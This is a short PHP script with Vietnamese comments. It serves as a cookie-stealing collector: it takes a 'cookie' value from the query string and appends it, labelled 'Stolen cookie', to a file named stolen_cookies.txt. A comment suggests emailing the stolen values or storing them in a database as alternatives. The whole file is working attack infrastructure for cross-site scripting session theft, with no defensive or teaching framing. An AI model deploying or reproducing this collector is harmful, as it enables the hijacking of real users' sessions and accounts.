<?php
// Lấy cookie từ tham số query string
if (isset($_GET['cookie'])) {
    $cookie = $_GET['cookie'];

    // Lưu cookie vào file hoặc xử lý nó
    $file = fopen("stolen_cookies.txt", "a");
    fwrite($file, "Stolen cookie: " . $cookie . "\n");
    fclose($file);

    // Hoặc có thể gửi cookie qua email hoặc lưu vào cơ sở dữ liệu tùy theo ý bạn
}

?>
